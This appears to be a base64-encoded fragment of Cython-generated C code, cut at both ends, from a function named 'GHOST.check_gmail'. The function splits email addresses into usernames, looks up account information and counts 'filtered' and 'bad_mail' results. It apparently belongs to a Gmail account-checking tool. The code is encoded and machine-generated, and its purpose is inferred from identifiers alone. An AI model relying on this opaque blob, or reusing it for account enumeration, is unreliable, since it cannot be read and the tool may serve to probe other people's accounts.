IV9fcHl4X3RfMTEpKSBnb3RvIF9fcHl4X0w1Nl91bnBhY2tpbmdfZmFpbGVkO1xuICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTtcbiAgICAgICAgICAgICAgICBpZiAoX19QeXhfSXRlcm5leHRVbnBhY2tFbmRDaGVjayhfX3B5eF90XzIyKF9fcHl4X3RfMTIpLCAyKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE1OSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICAgICAgX19weXhfdF8yMiA9IE5VTEw7XG4gICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDtcbiAgICAgICAgICAgICAgICBnb3RvIF9fcHl4X0w1N191bnBhY2tpbmdfZG9uZTtcbiAgICAgICAgICAgICAgICBfX3B5eF9MNTZfdW5wYWNraW5nX2ZhaWxlZDo7XG4gICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDtcbiAgICAgICAgICAgICAgICBfX3B5eF90XzIyID0gTlVMTDtcbiAgICAgICAgICAgICAgICBpZiAoX19QeXhfSXRlckZpbmlzaCgpID09IDApIF9fUHl4X1JhaXNlTmVlZE1vcmVWYWx1ZXNFcnJvcihpbmRleCk7XG4gICAgICAgICAgICAgICAgX19QWVhfRVJSKDAsIDE1OSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICAgICAgX19weXhfTDU3X3VucGFja2luZ19kb25lOjtcbiAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3ZfdXNlcm5hbWUsIF9fcHl4X3RfNik7XG4gICAgICAgICAgICAgIF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgICAgIF9fcHl4X3ZfZ2cgPSBfX3B5eF90XzExO1xuICAgICAgICAgICAgICBfX3B5eF90XzExID0gMDtcblxuICAgICAgICAgICAgICBcbiAgICAgICAgICAgICAgX19weXhfdF8xMSA9IF9fcHl4X3Zfc2VsZjtcbiAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgICAgICAgICBfX3B5eF90XzEzID0gMDtcbiAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1szXSA9IHtfX3B5eF90XzExLCBfX3B5eF92X3VzZXJuYW1lLCBfX3B5eF92X2dnfTtcbiAgICAgICAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZCgoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9JbmZvQWNjLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzEzLCAoMy1fX3B5eF90XzEzKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDE2MCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG5cbiAgICAgICAgICAgICAgXG4gICAgICAgICAgICAgIGdvdG8gX19weXhfTDU1O1xuICAgICAgICAgICAgfVxuXG4gICAgICAgICAgICBcbiAgICAgICAgICAgICB7XG4gICAgICAgICAgICAgIF9fcHl4X3RfMTEgPSBfX3B5eF92X29yaWdpbmFsX2VtYWlsO1xuICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xMSk7XG4gICAgICAgICAgICAgIF9fcHl4X3RfMTMgPSAwO1xuICAgICAgICAgICAgICB7XG4gICAgICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzd9O1xuICAgICAgICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKChQeU9iamVjdCopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NwbGl0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzEzLCAoMi1fX3B5eF90XzEzKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDE2MiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgaWYgKChsaWtlbHkoUHlUdXBsZV9DaGVja0V4YWN0KF9fcHl4X3RfNSkpKSB8fCAoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfdF81KSkpIHtcbiAgICAgICAgICAgICAgICBQeU9iamVjdCogc2VxdWVuY2UgPSBfX3B5eF90XzU7XG4gICAgICAgICAgICAgICAgUHlfc3NpemVfdCBzaXplID0gX19QeXhfUHlTZXF1ZW5jZV9TSVpFKHNlcXVlbmNlKTtcbiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoc2l6ZSAhPSAyKSkge1xuICAgICAgICAgICAgICAgICAgaWYgKHNpemUgPiAyKSBfX1B5eF9SYWlzZVRvb01hbnlWYWx1ZXNFcnJvcigyKTtcbiAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKHNpemUgPj0gMCkgX19QeXhfUmFpc2VOZWVkTW9yZVZhbHVlc0Vycm9yKHNpemUpO1xuICAgICAgICAgICAgICAgICAgX19QWVhfRVJSKDAsIDE2MiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICAgICAgICAgICAgIGlmIChsaWtlbHkoUHlUdXBsZV9DaGVja0V4YWN0KHNlcXVlbmNlKSkpIHtcbiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMTEgPSBQeVR1cGxlX0dFVF9JVEVNKHNlcXVlbmNlLCAwKTtcbiAgICAgICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzExKTtcbiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfNiA9IFB5VHVwbGVfR0VUX0lURU0oc2VxdWVuY2UsIDEpO1xuICAgICAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZkZhc3Qoc2VxdWVuY2UsIDAsIF9fUHl4X1JlZmVyZW5jZVNoYXJpbmdfU2hhcmVkUmVmZXJlbmNlKTtcbiAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCAxNjIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzExKTtcbiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5TGlzdF9HZXRJdGVtUmVmRmFzdChzZXF1ZW5jZSwgMSwgX19QeXhfUmVmZXJlbmNlU2hhcmluZ19TaGFyZWRSZWZlcmVuY2UpO1xuICAgICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTYyLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF82KTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgI2Vsc2VcbiAgICAgICAgICAgICAgICBfX3B5eF90XzExID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKHNlcXVlbmNlLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDE2MiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTShzZXF1ZW5jZSwgMSk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE2MiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgUHlfc3NpemVfdCBpbmRleCA9IC0xO1xuICAgICAgICAgICAgICAgIF9fcHl4X3RfMTIgPSBQeU9iamVjdF9HZXRJdGVyKF9fcHl4X3RfNSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMikpIF9fUFlYX0VSUigwLCAxNjIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEyKTtcbiAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgICAgICAgICBfX3B5eF90XzIyID0gKENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkpID8gUHlJdGVyX05leHQgOiBfX1B5eF9QeU9iamVjdF9HZXRJdGVyTmV4dEZ1bmMoX19weXhfdF8xMik7XG4gICAgICAgICAgICAgICAgaW5kZXggPSAwOyBfX3B5eF90XzExID0gX19weXhfdF8yMihfX3B5eF90XzEyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgZ290byBfX3B5eF9MNThfdW5wYWNraW5nX2ZhaWxlZDtcbiAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7XG4gICAgICAgICAgICAgICAgaW5kZXggPSAxOyBfX3B5eF90XzYgPSBfX3B5eF90XzIyKF9fcHl4X3RfMTIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIGdvdG8gX19weXhfTDU4X3VucGFja2luZ19mYWlsZWQ7XG4gICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgICAgICAgaWYgKF9fUHl4X0l0ZXJuZXh0VW5wYWNrRW5kQ2hlY2soX19weXhfdF8yMihfX3B5eF90XzEyKSwgMikgPCAoMCkpIF9fUFlYX0VSUigwLCAxNjIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgICAgICAgIF9fcHl4X3RfMjIgPSBOVUxMO1xuICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7XG4gICAgICAgICAgICAgICAgZ290byBfX3B5eF9MNTlfdW5wYWNraW5nX2RvbmU7XG4gICAgICAgICAgICAgICAgX19weXhfTDU4X3VucGFja2luZ19mYWlsZWQ6O1xuICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7XG4gICAgICAgICAgICAgICAgX19weXhfdF8yMiA9IE5VTEw7XG4gICAgICAgICAgICAgICAgaWYgKF9fUHl4X0l0ZXJGaW5pc2goKSA9PSAwKSBfX1B5eF9SYWlzZU5lZWRNb3JlVmFsdWVzRXJyb3IoaW5kZXgpO1xuICAgICAgICAgICAgICAgIF9fUFlYX0VSUigwLCAxNjIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgICAgICAgIF9fcHl4X0w1OV91bnBhY2tpbmdfZG9uZTo7XG4gICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF92X3VzZXJuYW1lLCBfX3B5eF90XzExKTtcbiAgICAgICAgICAgICAgX19weXhfdF8xMSA9IDA7XG4gICAgICAgICAgICAgIF9fcHl4X3ZfZ2cgPSBfX3B5eF90XzY7XG4gICAgICAgICAgICAgIF9fcHl4X3RfNiA9IDA7XG5cbiAgICAgICAgICAgICAgXG4gICAgICAgICAgICAgIF9fcHl4X3RfNiA9IF9fcHl4X3Zfc2VsZjtcbiAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgICAgIF9fcHl4X3RfMTMgPSAwO1xuICAgICAgICAgICAgICB7XG4gICAgICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzNdID0ge19fcHl4X3RfNiwgX19weXhfdl91c2VybmFtZSwgX19weXhfdl9nZ307XG4gICAgICAgICAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSW5mb0FjYywgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMywgKDMtX19weXhfdF8xMykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTYzLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIF9fcHl4X0w1NTo7XG5cbiAgICAgICAgICAgIFxuICAgICAgICAgICAgZ290byBfX3B5eF9MNTQ7XG4gICAgICAgICAgfVxuXG4gICAgICAgICAgXG4gICAgICAgICAgIHtcbiAgICAgICAgICAgIF9fcHl4X3RfNiA9IF9fcHl4X3Zfc2VsZjtcbiAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzYpO1xuICAgICAgICAgICAgX19weXhfdF8xMyA9IDA7XG4gICAgICAgICAgICB7XG4gICAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9maWx0ZXJlZH07XG4gICAgICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKChQeU9iamVjdCopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2luY3JlbWVudF9jb3VudGVyLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzEzLCAoMi1fX3B5eF90XzEzKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDE2NSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgfVxuICAgICAgICAgIF9fcHl4X0w1NDo7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBnb3RvIF9fcHl4X0w1MztcbiAgICAgICAgfVxuXG4gICAgICAgIFxuICAgICAgICAge1xuICAgICAgICAgIF9fcHl4X3RfNiA9IF9fcHl4X3Zfc2VsZjtcbiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF82KTtcbiAgICAgICAgICBfX3B5eF90XzEzID0gMDtcbiAgICAgICAgICB7XG4gICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZmlsdGVyZWR9O1xuICAgICAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW5jcmVtZW50X2NvdW50ZXIsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMTMsICgyLV9fcHl4X3RfMTMpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxNjcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgfVxuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICB9XG4gICAgICAgIF9fcHl4X0w1Mzo7XG5cbiAgICAgICAgXG4gICAgICAgIGdvdG8gX19weXhfTDUyO1xuICAgICAgfVxuXG4gICAgICBcbiAgICAgICB7XG4gICAgICAgIF9fcHl4X3RfNiA9IF9fcHl4X3Zfc2VsZjtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNik7XG4gICAgICAgIF9fcHl4X3RfMTMgPSAwO1xuICAgICAgICB7XG4gICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JhZF9tYWlsfTtcbiAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZCgoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbmNyZW1lbnRfY291bnRlciwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMywgKDItX19weXhfdF8xMykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTY5LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgfVxuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgIH1cbiAgICAgIF9fcHl4X0w1Mjo7XG5cbiAgICAgIFxuICAgIH1cbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICBnb3RvIF9fcHl4X0w4X3RyeV9lbmQ7XG4gICAgX19weXhfTDNfZXJyb3I6O1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOSk7IF9fcHl4X3RfMTkgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yMCk7IF9fcHl4X3RfMjAgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yMSk7IF9fcHl4X3RfMjEgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG5cbiAgICBcbiAgICBfX3B5eF90XzI0ID0gX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcygoKFB5T2JqZWN0ICopKCgoUHlUeXBlT2JqZWN0KilQeUV4Y19FeGNlcHRpb24pKSkpO1xuICAgIGlmIChfX3B5eF90XzI0KSB7XG4gICAgICBfX1B5eF9BZGRUcmFjZWJhY2soInR0LkdIT1NULmNoZWNrX2dtYWlsIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzUsICZfX3B5eF90XzYsICZfX3B5eF90XzExKSA8IDApIF9fUFlYX0VSUigwLCAxNzAsIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcilcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTtcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF82KTtcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xMSk7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF82KTtcbiAgICAgIF9fcHl4X3ZfZSA9IF9fcHl4X3RfNjtcbiAgICAgICB7XG5cbiAgICAgICAgXG4gICAgICAgIF9fcHl4X3RfMjEgPSBfX3B5eF92X3NlbGY7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzIxKTtcbiAgICAgICAgX19weXhfdF8xMyA9IDA7XG4gICAgICAgIHtcbiAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JhZF9tYWlsfTtcbiAgICAgICAgICBfX3B5eF90XzEyID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW5jcmVtZW50X2NvdW50ZXIsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMTMsICgyLV9fcHl4X3RfMTMpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIxKTsgX19weXhfdF8yMSA9IDA7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEyKSkgX19QWVhfRVJSKDAsIDE3MiwgX19weXhfTDY1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEyKTtcbiAgICAgICAgfVxuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwO1xuICAgICAgfVxuXG4gICAgICBcbiAgICAgICB7XG4gICAgICAgIHtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdl9lKTsgX19weXhfdl9lID0gMDtcbiAgICAgICAgICBnb3RvIF9fcHl4X0w2NjtcbiAgICAgICAgfVxuICAgICAgICBfX3B5eF9MNjVfZXJyb3I6O1xuICAgICAgICB7XG4gICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICAgICAgICBfX3B5eF90XzkgPSAwOyBfX3B5eF90XzggPSAwOyBfX3B5eF90XzcgPSAwOyBfX3B5eF90XzEwID0gMDsgX19weXhfdF8xNCA9IDA7IF9fcHl4X3RfMTUgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOSk7IF9fcHl4X3RfMTkgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yMCk7IF9fcHl4X3RfMjAgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yMSk7IF9fcHl4X3RfMjEgPSAwO1xuICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25Td2FwKCZfX3B5eF90XzEwLCAmX19weXhfdF8xNCwgJl9fcHl4X3RfMTUpO1xuICAgICAgICAgIGlmICggdW5saWtlbHkoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzksICZfX3B5eF90XzgsICZfX3B5eF90XzcpIDwgMCkpIF9fUHl4X0VyckZldGNoKCZfX3B5eF90XzksICZfX3B5eF90XzgsICZfX3B5eF90XzcpO1xuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF85KTtcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzcpO1xuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xMCk7XG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE0KTtcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTUpO1xuICAgICAgICAgIF9fcHl4X3RfMjQgPSBfX3B5eF9saW5lbm87IF9fcHl4X3RfMjUgPSBfX3B5eF9jbGluZW5vOyBfX3B5eF90XzI2ID0gX19weXhfZmlsZW5hbWU7XG4gICAgICAgICAge1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3ZfZSk7IF9fcHl4X3ZfZSA9IDA7XG4gICAgICAgICAgfVxuICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTApO1xuICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTQpO1xuICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTUpO1xuICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMTAsIF9fcHl4X3RfMTQsIF9fcHl4X3RfMTUpO1xuICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOSk7XG4gICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpO1xuICAgICAgICAgIF9fUHl4X0VyclJlc3RvcmUoX19weXhfdF85LCBfX3B5eF90XzgsIF9fcHl4X3RfNyk7XG4gICAgICAgICAgX19weXhfdF85ID0gMDsgX19weXhfdF84ID0gMDsgX19weXhfdF83ID0gMDsgX19weXhfdF8xMCA9IDA7IF9fcHl4X3RfMTQgPSAwOyBfX3B5eF90XzE1ID0gMDtcbiAgICAgICAgICBfX3B5eF9saW5lbm8gPSBfX3B5eF90XzI0OyBfX3B5eF9jbGluZW5vID0gX19weXhfdF8yNTsgX19weXhfZmlsZW5hbWUgPSBfX3B5eF90XzI2O1xuICAgICAgICAgIGdvdG8gX19weXhfTDVfZXhjZXB0X2Vycm9yO1xuICAgICAgICB9XG4gICAgICAgIF9fcHl4X0w2Njo7XG4gICAgICB9XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgIGdvdG8gX19weXhfTDRfZXhjZXB0aW9uX2hhbmRsZWQ7XG4gICAgfVxuICAgIGdvdG8gX19weXhfTDVfZXhjZXB0X2Vycm9yO1xuXG4gICAgXG4gICAgX19weXhfTDVfZXhjZXB0X2Vycm9yOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMik7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8zKTtcbiAgICBfX1B5